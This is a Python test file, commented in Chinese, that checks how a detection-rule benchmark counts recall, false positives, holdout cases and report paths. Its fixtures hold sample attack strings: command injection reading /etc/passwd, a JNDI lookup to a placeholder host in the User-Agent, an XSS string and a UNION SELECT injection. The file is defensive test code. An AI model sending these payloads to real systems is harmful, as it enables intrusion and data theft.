"""跨项目交叉评测（`bench/run_crosscheck.py`）的口径守卫。

这个脚本的数字会写进 README 和面试材料，所以**口径比功能更重要**：
分母里放什么、什么不算漏检、哪些明细不能公开、哪个缺口是已知的——
每一条都可能被「顺手改一下」改坏，而且改坏之后数字看起来依然合理。
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from bench import run_crosscheck as cc  # noqa: E402


def _corpus(tmp_path: Path, cases: list[dict]) -> Path:
    p = tmp_path / "corpus.json"
    p.write_text(json.dumps({"source": "test", "cases": cases}, ensure_ascii=False),
                 encoding="utf-8")
    return p


def _case(**kw) -> dict:
    base = {
        "id": "T-001", "set": "corpus", "category": "sqli", "name": "case",
        "is_attack": True, "method": "GET", "path": "/", "query": "", "body": "",
        "ua": "", "headers": {},
    }
    base.update(kw)
    return base


# ---------------------------------------------------------------- 分母口径


def test_unsupported_categories_excluded_from_denominator(tmp_path):
    """没有 RCE 规则时，RCE 样本不能算成「检出率 0%」——它根本不在分母里。"""
    p = _corpus(tmp_path, [
        _case(id="R-1", category="rce", query="cmd=;cat+/etc/passwd"),
        _case(id="R-2", category="rce", query="cmd=|whoami"),
    ])
    res = cc.evaluate(p)
    assert res.supported_attacks == 0, "RCE 不在检测范围，不该进分母"
    assert res.unsupported_attacks == 2
    assert res.recall == 0.0, "分母为 0 时返回 0.0，不能抛除零异常"
    assert res.cats["rce"].supported is False


def test_scanner_is_attack_not_benign(tmp_path):
    """bypasslab 的 scanner 类是 8 条**攻击**样本（sqlmap/Nikto UA 指纹，IsAttack=true）。
    把它当良性样本会让「范围外攻击数」少算 8 条。"""
    p = _corpus(tmp_path, [
        _case(id="SC-1", category="scanner", name="UA 指纹", ua="sqlmap/1.7.2#stable"),
    ])
    res = cc.evaluate(p)
    assert res.cats["scanner"].supported is False
    assert res.cats["scanner"].attacks == 1
    assert res.unsupported_attacks == 1


def test_negative_sample_hit_counts_as_false_positive(tmp_path):
    """良性样本被命中必须记误报，不能因为「数据集没有攻击窗」就略过。"""
    p = _corpus(tmp_path, [
        _case(id="B-1", category="benign", name="良性但含 script", is_attack=False,
              path="/comment", query="c=%3Cscript%3Ealert(1)%3C/script%3E"),
    ])
    res = cc.evaluate(p)
    assert res.false_positives == 1
    assert res.fp_total == 1
    assert res.benign_total == 1


# ---------------------------------------------------------------- 事件构造


def test_user_agent_payload_reaches_rule(tmp_path):
    """JNDI 载荷可能**只**放在 User-Agent 里（bypasslab 的 W2-DESER-1..5 就是）。
    事件构造必须把 UA 拼进 raw，否则会制造假漏检。"""
    case = _case(id="U-1", category="deserialization", name="UA JNDI",
                 ua="${jndi:ldap://evil.example/a}")
    ev = cc.build_event(case, 0)
    assert "jndi:ldap" in ev.raw.lower(), "UA 必须进入 raw，否则规则看不到"
    assert "jndi:ldap" in ev.normalized

    res = cc.evaluate(_corpus(tmp_path, [case]))
    assert res.cats["deserialization"].detected == 1


def test_form_plus_gap_is_quantified_not_hidden(tmp_path):
    """`+` 在 form 编码里就是空格，但当前 `normalize()` 不解。

    这个已知缺口必须被 what-if 显式量化——否则读者会以为「规则连
    union select 都抓不到」，把归一化问题误判成规则问题。
    若本测试失败，说明归一化已经被改过，报告里的 49.6% → 55.6% 需要重算。
    """
    p = _corpus(tmp_path, [
        _case(id="S-1", category="sqli", name="form 编码 union",
              path="/product", query="id=1+UNION+SELECT+username+FROM+users"),
    ])
    res = cc.evaluate(p)
    assert res.supported_detected == 0, "当前归一化不解 +，应漏检"
    assert res.whatif_detected == 1, "补上 + 解码后应能命中"
    assert res.miss_samples[0].whatif_hit is True


# ---------------------------------------------------------------- 报告纪律


def test_holdout_misses_are_not_listed(tmp_path):
    """冻结语料只进总数、不进明细——否则会破坏 bypasslab 的泛化测试机制。"""
    cases = [
        _case(id="Holdout-SQLI-99", set="holdout", category="sqli",
              query="id=1+UNION+SELECT+1"),
        _case(id="W2-SQLI-99", set="corpus", category="sqli",
              query="id=1+UNION+SELECT+1"),
    ]
    res = cc.evaluate(_corpus(tmp_path, cases))
    listed = {r.case["id"] for r in res.miss_samples}
    assert "W2-SQLI-99" in listed
    assert "Holdout-SQLI-99" not in listed, "holdout 明细不得公开"
    assert res.holdout_attacks == 1
    assert res.miss_total == 2, "总数可以报，明细不行"


def test_report_has_no_absolute_paths(tmp_path):
    """报告会提交进公开仓库，不能把开发机目录写进去。"""
    p = _corpus(tmp_path, [_case(id="S-2", category="sqli", query="id=1")])
    text = cc.render(cc.evaluate(p))
    assert str(tmp_path) not in text
    assert "C:\\" not in text
    assert "D:\\" not in text
